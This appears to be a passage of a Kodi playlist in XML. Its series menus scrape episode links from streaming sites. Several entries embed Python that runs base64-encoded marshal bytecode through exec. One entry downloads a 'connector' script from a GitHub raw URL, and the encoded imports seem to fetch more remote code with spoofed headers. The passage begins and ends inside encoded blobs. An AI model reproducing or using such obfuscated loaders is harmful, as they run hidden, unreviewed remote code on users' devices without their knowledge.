mxLR3RsZVcxaGEyVnlJQ3dnZW1sdmJpbDBBd0FBQUc1bGIzTUlBQUFBUEhOMGNtbHVaejUwQkFBQUFHVjRaV01vQ3dBQUFIUUdBQUFBWW1GelpUWTBkQVlBQUFCamIyUmxZM04wQ0FBQUFHMXZjbkJvWlhWemRBY0FBQUIwY21sdWFYUjVVZ1FBQUFCMENBQUFBR3RsZVcxaGEyVnlkQVFBQUFCNmFXOXVkQVFBQUFCbGRtRnNVZ1VBQUFCMEJ3QUFBR052YlhCcGJHVjBDUUFBQUdJMk5HUmxZMjlrWlNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6RGdBQUFCZ0JCZ0VHQVFZQkJnRUdBU29CIikpKQ=="))
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param2] [makelist2.param3][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param2] [makelist2.param3][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param4]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param2][temp.param3][/COLOR]</title>
<info>[COLOR white][temp.param2][temp.param3][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param4]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[(?s)choose-season".*?href="(.*?)".*?>(.*?)<.*?>(.*?)<]]></expres>
<page>[makelist2.param5]</page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param1][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[makelist2.param4]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[(?s)num-epi">(.*?)<.*?<a href="(https://seriesflix.io/episodio.*?)" class="lnk-blk"]]></expres>
<page>[temp.param1]</page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param3] [link_final.param2][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[makelist2.param4]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url1 = '[cap.param2]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>final_url</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[final_url]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/qvzF7Rz.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
</item>
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [/COLOR][COLOR white]Hd[/COLOR] </title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[COLOR gold]*[/COLOR] [COLOR lightseagreen]Series Hd [COLOR white][A.param1] [/COLOR]</title>
<thumbnail>https://i.imgur.com/Aqhr7Ig.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
<link>$doregex[makelist2]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data, Cookie_Jar, m):
    items = [('Buscador', 'search', ''), ('Estrenos', 'estrenos', ''), ('Ranking Imdb', 'ranking', ''), ('Genero', 'genero', '')]
    return items
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param2] [COLOR aqua]*[makelist2.param4][makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param2] [COLOR aqua]*[makelist2.param4][makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>https://hdfull.se[makelist2.param3]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MEt5QUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RKT1JGa3lXa1JWZDAxNldUTk9SRmsxVGxSamVrNVVXbXhPZWxFd1dXcEthVTVVU1hwUFZGVjZUbnBGTWxwcVdURk9lazB4VGxSamQwNVVXVEpOVkZFMFRtcHJNRTVFWTNoT2FtY3dXbFJWTUU1VVdUSlphbHBwVG0xSk1rMXFVVEJOZWsweVQwUlJNRTVxVlRCT2VsRjZUbnBqTVU1cVZYcE5iVmt5VG5wVmVFNTZaekJOYWxrelRrUlJNRTlFV1hsT2FrMHdUMVJSTUU0eVJYcFBSRXBwVG5wWmVrNXFTbWxPVjBVeFRrUlNhRTU2V1hwTlZGVXlUbFJqTTAxcVRYaE9WRVY1V21wTk5VNUVWVEJhYWxFMVRsUnJlazlVWTNsT1JGRjZUV3BhYTA1NlVUSk9SRmt4VG0xVmVrOUVUVFJOYlZsNVdtcFZORTVxUlhwUFJGRXlUbXBaTWs1VVdUSk9lbWQ2VGxSS2FVMXRXVEJQUkZreVRucEJNazVxV1RKTmJWa3lXa1JhYkUxNlRYbFphbGw0VG5wQmVWbHFTbWxPZWswelRtcGpNazF0V1hwT1ZHTTFUbnBKTTA1VVkzbE5lbU42VGxSTk5VNXFVVE5PYWxrMFRXMVplazE2V1RKT2JVVXlUMVJLYVU1VVVUSk9ha3B0VG5wVk1GcFVVVFZOZWxFelRWUktiVTF0V1RKT2FtTjNUa2ROTWs1RVdUSk5iVWt6VFhwVmQwMTZVWHBPYWxWM1RucFplVnBxVFhwTmVra3dUMFJOTTAxdFdYcFBWRTB6VG5wWk1rNVVaR2hOZWxsNlRtcFJNazVxUlRKT2FtTXhUbXBaTTA1VVkzZE9lbGt4VGtSWk1FNVVhekJPZW1OM1RrUm5lazlVVFRCT2Vsa3pUbXBOTVU1SFdUTk9WRTB3VFhwRk1VMXFWbWhOZWtreFRtcFNiRTVxVlRCUFJFMTZUbXBWTTA5VVRUTk9lbFV3VGxSVk0wNXRWVE5OYWxKb1RtMVpNVTFFV1RGT1YwVXpUVVJqZDAxNlVURk5ha3BwVGpKRk1sbDZUVEJPUjFWNlRucFZkMDVxVlRGTlJHUm9UbXBOTWxsVVVUQk9hbXN5VFZSTmVVNXFSVE5OVkdNeVRYcEpNRTVxV1RGT2Fsa3lUWHBSTUU1NldUSmFSRlUwVGtSak0wNUVVbXRPYWxVeVRtcGplVTVVYXpCTlZGbDVUbnBSZWsxNll6Qk5lazB5V21wVmVVNVVZM2xaYWswMVRXMUpNbHBVVFRST1ZGVXpUMFJhYUU1SFNUQmFWRlYzVFhwVk1WbFVVVEJPYWtVeFRYcE5NMDU2VVRGT1JGRXlUWHByTVU1Nll6Vk9lazB5V1ZSak1FNXFVVEpOYW1NeFRucE5NMDE2V21sT1JHY3hXVlJWZVU1cVJUSk9WRkV6VG1wSk1FNXFXVFJPYW10NlRsUmFiRTVIUlRGUFZFMHlUWHBuTTA1RVVYbE9WRkV4V1ZSWk1rNVVXVE5PVkdONlRYcG5NMDVxVFRKTmVsa3lXV3BaZUU1SFRUQk5lbEpzVGxSQmVrOUVTbWxPZWswelQxUlNhazVVUlRKT1ZGSnJUbnBqTVU1NlRUUk5iVWw1V21wWk5VNUVhekpPUkdSb1RucG5NMDFxWTNkT1ZHTXdUVlJOTWs1VVl6Tk9WRlV4VG5wRk1GbDZUVEpPYWxrd1QxUlZlazV0VVRKTmVtTXdUa2ROTUZwVVdtcE9iVlV5VFZSVk0wNUVVWHBQUkdNd1RsUmpNMDFVWXpWT2FtY3dXV3BWTlUxNldUTk5hbU14VGtSWmVrNXFVVEZPZWxFeFRWUmpNazU2VFRKYWFrMHdUakpGTWxsNlRURk9WR3N4VFZSS2JVNTZTVEJhYWxsNlRYcFplVmxxWXpCT1IwVXlUbFJaZUUxNlp6Tk9WRkpxVG0xWmVrNXFZekJOZWtFeVdWUlpNazV0U1hsWmFrMHhUbnBOTWs1cVZUVk9lbWQ2VDFSU2FVNTZhekZPYWxFeFRYcEpNVTU2V1hsT2JWa3hXVlJhYkUxNlFUQlpWRmw2VGxSak1VMXFXbXhPYWtVd1dWUlZlRTVFWnpOTmVtTTBUbnBKTUZwVVVtbE9lazB4VG5wTmVVNUhTVEJhVkZKcVRrUkZNVTU2VFRWT1JGa3hUMFJOTWsxNlRUQk5la3B0VG5wck1rNUVVWGxPZWtFeFRtcFJNMDVVVlhwUFZGRjZUbnBSTTAxcVdUQk9SMGt5V21wVk0wMTZSWHBPZWxKcFRsUkJNazU2VlhkT2FsRXpUMVJqTkU1VVVUSk9hbEV3VFhwRk0wNTZXVEpOZW1zd1RtcGpOVTVIU1RCT1JHTXhUbnBaTWs5VVZUTk9ha2t4VG1wamVFNUhTVEZOUkZWNlRsUlpNRTlFVlRKT1ZFbDZUa1JTYkU1NlVURk5hbEV5VFhwUk1VOUVZelZPYlUwd1RrUmplVTU2UVhwT2FrcHRUa1JqTVZsVVdtbE9WRVY2VFhwUk1FNUVZekpPVkdNeVRtcG5lazlVVlhkT2FrMHdUMFJOTWs1dFdUQk9SRnBzVFcxWk1VNTZVbXBPZWtFelRXcFNhMDE2UVROT2FsSm9Ua1JaZWs5VVVtaE9hbEV3VG5wU2JVNUhVWHBPUkZGNVRsUm5lazVFVFRGT2VtTjZUMFJhYlU1NlZUSk9SRkpvVG5wak1rMXFUVEJOYlVrd1drUlNhVTE2V1hwTmFsSnBUbXBaTWxwcVVtMU9SR3Q2VDBSWk1FNVVTVEJPYWxreFRsUnJNbGw2VFROTmJVa3lUbnBaTWs1VVp6Qk5hbEUxVFhwWk0wNTZUWHBOYlVrd1dXcFJlRTVVVVhsWmFrMTRUbFJuZVZscVkzcE9SMDB4VFdwU2FFNXFTVE5PZWxsNVRXMUplazlFV214T2FrMHdUMFJOZWsxNlVUQmFSRmt4VG1wWk1sbDZUVEpPVkZVelQxUlZNMDVxV1RCUFZHTjRUbFJaTWxwcVdYaE9hbFV3VFZSVk5VMTZhekJPZWxKcFRXMVpNbGw2VVRKTmVtc3hUbXBqTkU1VVFURk9hbHBwVG1wWmVWcHFVVEpOZWxreVdrUk5NRTVFWnpGTlJGRXlUbXBaTWs1cVVUSk5lbXN6VGxSYWFFNXFSVE5QUkZKcVRucFZNbHBVVlRKT2FrMHlXVlJqZWs1NldUSk9WRlpvVFhwWk1VNXFVVEJPVkdkNlRrUktiVTF0U1RKTmVsRjVUWHByTTA1NlZYbE9hazB4VGtSU2EwNTZVVEJOZWxVelRtcEZNazFVVlhwT1ZFRXdXa1JaTlU1Nll6SmFSRnBwVGtSSk0wNXFUWHBOZWxrelQxUlJNVTV0VlROWlZGSnJUbXBSZVZscVVUSk9WR2N5V2tSTk5FNXRWVEpaZWxGNFRucFpNbGw2WXpGT2JVMHhUa1JSTUUxNlp6SlBWRkUwVGtSck1rNUVVbXhPZW1NeldWUmplRTV0VlRKYWFsRjZUbXBaTWxsNlkzZE9WMFY2VFZSamVVNUVZek5PUkZWNlRucEpNRnBFWXpGT2Vtc3lXVlJqTTAxNlJUTlBSRXB0VG0xTk1rOVVXVEZPYWxVeFRtcFJNRTVxV1RKWmVsa3pUbnBaTVU1NlZUSk9SMGt4VFVSYWJVNUhSVEZPUkZKcFRtcFpNVTlFVW10T2VtTXhUMFJaTkU1dFdUQlpWRTE2VGxSSk1GbDZUVFZPUjFGNlRVUmFhMDU2V1hwT2FsRXpUa2ROZWs1NldUUk9la2w2VG5wWk0wNUVZM3BPZWxwdFRtcHJNRmw2VVRWT2VtZDZUWHBLYlU1WFJUQk5hbFY1VFhwck1VMVVZekpPYW1jeVRWUk5OVTU2UlhwT1ZGRTBUVzFKTWsxVVZUQk9hbGt5V1dwTk5VMTZSWHBOVkdONFRtMVJlazVFVW14TmVtY3dUbXBOTWsxNlJURlpWR041VFcxWk1FMXFZekpPZW10NlRsUlpNazU2U1RGT1ZGSnFUVzFKTWs1NlZUTk5lbXN3VG5wTk5VNUVUVEpPYWxsNlRqSkZNRTlVVlhsTmJWa3pUa1JhYVU1NmF6QlplbHBwVG5wRmVrMUVXVFJPZWtVeFQwUk5lRTVFV1RGUFJGcHRUbFJWTTA1NlRUUk5lbXN3VFZSTmQwMXRXVEJOVkdONVRucHJNMDFxVlRCT1ZGbDZUV3BhYWs1cVZUQlplbU41VG1wWk1sbHFVbTFOYlVreFRsUmpNVTVxVFRKT2VsRXdUVzFaTUUxNlNtMU9SRVV3VG5wWk1FNUVSWHBOZWxrelRucGplazFVVVhwT1JFVXdUa1JaTTA1NlVYcE5SRnBwVGxSck1rMVVWVEJPUkVreVdsUmFhazVFVFRKWmVrMDFUbXBaTVU1VVVteE5iVmt3VFZSa2FFNUhVVEpaZWxsNVRtMUpNRTVFU21sT2Fsa3lUV3BqZWs1NlNYbFphbU14VGtkTk0wMUVVWGhOZW10NlQxUlZOVTU2VVhwUFJGRXpUa1JOTUUxVVl6Sk9SMWw2VG5wTk1FNTZUVEJhYWxWNVRYcFplazVxWTNwT1ZHY3hUWHBOTVU1dFZUSlBSRkUxVFcxSmVrNVVVbWhPYWxFeVQxUmFhVTVFWnpGT2VtTjNUbTFWZWs5VVVYaE9SRkV5V2xSU2FVNUVVVEphVkZreVRtcG5NbHBVV21sT1JGRXlXbFJOZVU1RVp6SmFWRmswVGxSRk1rMVVTbWxPVkVVeFRWUk5OVTE2V1ROUFZGRXlUWHBOTTFsVVl6Rk9hazE2VGtSa2FFNUVSVEZOUkZreVRtcG5NbGxVVlRST1Ixa3lUMFJWTUUxdFdUQlBWRmw1VGxSak1sbHFVbXBPUkdkNlQwUlJNRTF0V1hsYWFsSnJUakpGZWs1VVdtMU9SRVV5V2xSa2FFNXFSVEJPYWtwcFRsUkZlazE2VFhwT1JFVXdUWHBhYkU1cVVUQk9WR016VFhwWk0wNVVVVEZPYWtWNlQxUlpNMDVIVFhwT2FrMTNUWHBKTTA5VVZURk9lazE2VG1wTmVFNXRXVEpaZWsweVRrUk5NRTFxVFRWT1JGa3dUMFJaTVUxNlFUQmFha3BwVG5wUk1rNTZTbTFPYlZFelRucFZNazF0V1RCWmVsVTFUakpGTWs5VVVYaE9WRUV3VFdwTmVrNXRXVEJPUkZKdFRucG5NMDlFVW0xTmVsRXdUVlJqTWsxNlVYcE9hbHBvVFhwak1sbDZWWGRPVkVFeVRucFJNMDE2VlRCT1ZGSnFUbXBKZWsxVVdtbE9WR2N3V21wVk1rNVVhekZaVkUweFRrUmpNazVxV1RST1JFa3pUbXBWTlU1Nlp6Qk9lbGt4VGxSRk0wMUVUVFZPVkUweVQwUlZkMDF0U1RGUFJGazBUakpGTWxwcVVUUk9SMWt4VG1wWk1FNXFZekJPYWtwcFRsUkZlazFxV1RCT2Fra3dUV3BTYlU1cVp6SlplazB3VG1wSk1GcHFVVEpOZWswd1dsUlpNRTVIUlRCUFJGa3hUbnByTUZwRVNtMU9ha2t5VGxSamQwNVVTVE5QUkZKdFRYcHJNazFxU21sT2Ftc3dUa1JOTWs1RVZYcFBWRnB0VGxkRk0xbFVZM2hOZWsweFRrUk5NMDV0U1RGTmFrcHRUbFJWZWs1VVRUVk5lbU14VFZSak5FMTZXVEpaYWxFd1RXMVpNMDE2V1hsT1ZHTXdUa1JLYVU1RVdYcE5lbEp0VGpKRk1VMTZXVE5PVkVGNlRXcFplazU2UlRGWlZHTXhUbXBqTTA5VVl6Vk9WRkV5VG1wUk5VNUVZM2xhYWxsNFRsUkJlVnBxWXpOT1JGVXhXVlJTYWs1RVNYcE5WRkUxVGtSUmVWbHFXWHBOZW10NlRVUlNhRTF0V1RGT1ZGRXpUbTFGZWsxRVZYbE9lbXN6VG1wamVFNXFZM2xaYW1NeVRtcGpNVTVFVW14T1JFMTZUWHBqTlUxNlZUTk5SRTB5VG1wck0wMXFWVEpPYlZsNlQxUk5OVTR5UlRCUFJGcHRUbGRGTTFsVVVYbE9SRTB6VG5wWk1rNXRWVE5aVkUxM1RtcEplazlVWTNwT2VrMHdUMFJqZVU1RWF6Sk5lbEUxVG1wWmVrNVVVbTFPVjBVd1RucE5kMDVFWXpKT2FsSnBUbTFSTWs1RVNtbE9lbEV6VFZSVk1rNUhXVEZOVkZFMFRYcFZlazlFWTNkT1ZHZDZUMVJSZVUxNlJUTk9lbGw1VG5wRk1VNVVaR2hPZW1NeFQwUkthVTE2WnpKT2VsSnBUWHBqTVUxNlZUUk9iVWt3V21wUmVVNXFTWHBPVkZWNFRYcE5lazE2VVRGT2FsVjVXV3BTYVU1SFVURk9hbFYzVFhwWk1scFVXVEpOZW1zelRXcGFiVTV0VlRKT2Fsa3dUbXByTTA1cVl6Tk5lbU16VFVSVk5VNXFhM3BOZWxab1RsUlJNazFVV210T1JHdDZUWHBSTWsxNmF6Qk9WRnBvVG0xVk1FMVVZekpPZW1zeFRrUlNhVTVIVVRCWlZGa3lUa1JOTTA1cVRYaE9la2t5VFZSWk1rNXFXVEZPZWsxNFRrUmpNazVVVW1wT2VsbDZUVlJhYTA1SFVURlBWRmt6VG1wVk1FNUVZM2hPUjBWNVdtcE5NRTVFUlROT2FsVjNUbFJSTVU1RVdteE9iVlV5V1hwTk5VNUVaekpPVkZsNlRsUlZlazVxVFROT1JHY3dUbFJWTUUxdFdURk9WR013VG0xWk0wOUVUVE5PUkZreldWUk5ORTE2WXpKT1ZGVTFUa1JSZVZwcVVYaE9SMVY1V21wWmVrNUVZM3BPZW1NMVRrUkZlVmxxV1hwT1JGRXlUbXBOTWs1dFRYcE5lbEp0VG5wWk1VNVVUVFJPYlZreldWUk5lRTVVU1RCT1JFMHlUbTFKTWs1cVl6Qk9SRmt4VDBSamVFMTZXVE5PZWxVeFRYcFpNbGw2VlhsT1ZHc3lUWHBhYUUxdFdUQmFSRlV6VGpKRmVrMVVXVFJPUkVWNVdXcFpNVTVFV1ROTmVtTjNUa1JOZVZscVRYaE9lbWN6VFdwWk0wNUVSWGxaYWxwc1RsUkJNMDFVWTNwT2VtdDZUVlJOZVU1RVVUQk5hazEzVG0xWk1VNUVWWGRPUkdjelRtcFNiRTU2V1hwTlJFMTZUWHByTWxwVVZUUk5lbFV4VFVSWk1rNXRUVEpaZWsxM1RtcEplazlVVW10T2VtZDZUV3BaTVU1cVRUTk5hbGt5VGtkRmVrMVVXbWxPVjBVelRtcE5NRTVVUlhsWmFtTTBUa1JSTVUxRVZYbE5iVmt4VG5wTk5FNUhUVEJhUkZwcVRYcHJNVmxVVVRCTmVtY3dUMVJTYUUxdFNUSlBSRlV5VFhwak1FNUVZM2xPUkZreFRVUlZOVTU2WjNsWmFsSnRUbFJSTUU1RVdUUk9SR2N4V1ZSU2FrNTZXVE5PZWxwb1RtcFJNRnBVV1hwT1ZGa3lUbXBhYVU1SFRYcFBSRTE1VFcxWk1VNUVWVEJPZWxFd1RsUmpNazVVYXpOT2FsSnJUbTFaTVU1cVdURk9WRlV4VG1wS2FVNUVZM2xaYWxFMVRrZFJlazFxV214T2JVa3lXV3BaZWs1NlFUQmFWR00xVG1wamVrOVVTbTFPVkVreVRXcFNhVTVVWjNwTlJGa3hUbXBSTUZsVVdUUk5lbGt4VDBSUk1FNXRWVEZPVkZGNFRYcFJlazE2U21sT2FsRXpUVVJWTTA1RVRYbGFhbU0wVGxSbk1VMUVWWHBPVjBVelRsUlZlVTF0U1RCUFZGRjVUWHByTWs1cVVtdE9WR3N6VDFSVk1FNXFUWHBPVkZFd1RXMVplVmxxVW1sT1Iwa3lXbFJOTTAxdFdURk5WRXB0VFhwWk0xbFVXbTFPYWxrelQxUlJlRTVVVVRKYVZGRjVUbXBaZWsxRVVUSk9ha1V3VFZSTk0wNXRXVE5OUkUwd1RrZFpNRTVVWXpCT2FsRXpUWHBqZWs1cVZUTk9WRkpvVFhwbk1GbFVTbTFPZW1jeVdYcFZORTVFWXpCWlZGa3lUbTFWTVU1NldUTk5lazE2VGtSU2FFMXRTVEpPZWxwcVRtcE5lazVFVlhkTmVtY3hUMVJWTTAxNlVUQk9hazAxVFcxSmVrNVVXVEpPYlVrelQxUk5NazU2U1RKT2FsRTFUbFJuTWs1RVVUUk9hbGt3VDFSVmVFMTZZekJPUkZKcVRYcEZlazFFVlhoT1ZGRjZUV3BWZUU1cVdUTlBWRnB0VG0xTmVrMXFZM3BPTWtVeFQxUmFhVTE2UlRKWmVsbDVUWHBCTUU5RVNtbE9WRVY2VG5wTk1VNUhVWHBOZW1NMFRtcHJNRmxxVW10TmVsRjVXV3BOTUU1VVVYbFphbFUxVGpKRk0wNTZXWGxOZW1zd1RWUk5lazE2UVRKUFZGVjNUVzFKTWs1Nll6Sk9lbGt3VFZSWmVrMTZSVEJaZWxKc1RucG5NVTlFV1hwT1YwVXpUVVJOTWs1NlVUSk5lbGt6VG1wWk0wNVVXbWhPUkUweFQwUlJlRTVFV1ROTmFrMTNUWHBWZVZwcVVYaE9SMVV5V1ZSU2EwMTZWVE5OYWsxM1RXMUplazlVVVhsT2JVVjZUV3BqTTA1SFZYcE9lbEV6VGtkTk1GcFVXVEpPZW1ONlRsUkthVTVFWXpOTmFsVXdUbFJSZWsxVVVUQk9lbGw2VG1wVk5VMXRXVEZPZWxFelRucFZlazFFVlROT2FsVXlXVlJSZVUxNmEzcE5SRnBzVG0xUk1scEVZekpPUjFrd1RWUktiVTVFU1ROTmVsbDVUWHByZWsxNlVYaE9ha2w2VDFSU2FVNXFTWHBQUkZFMFRrZE5lazVxWTNkT1JHdDVXbXBSTUUxNlRUSlpWRkUxVG1wVk1VMXFVVFZPYWxVeldWUlpNRTVFWnpOT2FsbDZUbXByTWxwcVVUQk5iVmt5VDBSWk1FMTZRVEZaVkUweVRsZEZNazlFVFRGT1JFVXhUbnBqZVU1RWF6Sk5lbVJvVG1wak1scFVUVFJPYW1zd1RrUk5NVTU2VVROUFJGVXhUVzFKTUU5VVVtMU5iVWt3V1dwUmVVNUVZek5PYWxWNVRtMVZNbGxVVVhwT2Vsa3hXVlJXYUUxNmEzcE9WRkUxVG5wWk1VMVVVVFZOZW1zeFQwUk5lRTVIVFROTmVsVXhUbXBaTUZscVdYbE9hazB3V1hwYWJFNUVhekJhYWxVeFRXMVpNMWxVVlRKT1ZFVXhUVVJOZUUxNlZUTlBSRmt6VG5wVk1rMTZXWGxPVkZVeFRucE5NazVFU1ROT2FtTjRUbTFWZWs5RVdYbE9lbWN4VFVSak1rNTZUVEJOVkZKdFRtMVpNVTU2VFRWT2VrRXhUV3BTYWs1NldUQk9lbHBzVGtkRk1GcHFWVE5PUjFFeVRYcFplazVYUlhwUFJHTXpUbFJuTTAxNlRURk5lbEV6VDFSWk1rNTZTVE5OVkUwMVRrZEZNRTlFV20xT1JFMTZUa1JqZUU1SFNUSlBWRkUwVGtSWmVrNXFUVEZPUkdkNVdtcE5ORTV0U1RKTmVsazFUbFJSZWs1cVZUSk9lbFV5VG5wVk1VMXRTWHBOUkZsNVRsZEZNRTVVVFhwTmVrMHpUMVJqZWs1NmEzbGFhazE2VFhwVmVWbHFUVFJOZW1jeFRVUk5NazV0UlhwTmVtTTFUbTFGTUZsVVVtbE5lbFV3VGxSU2JVNUhSVEpaYW1NMFRYcHJlazlVV1RST1IxVjZUVlJaTTA1VVFYbGFhbHB0VGxSUk0wMXFZM2RPZWxFeVQwUlZkMDE2V1RCT1JGcHBUWHByZWs5RVpHaE9hazB5V1hwS2JVNUVTVE5aVkdNd1RrUkpNazVxVW14T1JGVXlXbFJqTlU1VVFYcE9SRmw1VG1wWk1rOVVUVE5OZWtFeFQwUk5ORTU2WXpCWmVrMHhUbTFGTVUxVVRYcE9iVVV4VFVSU2FVNT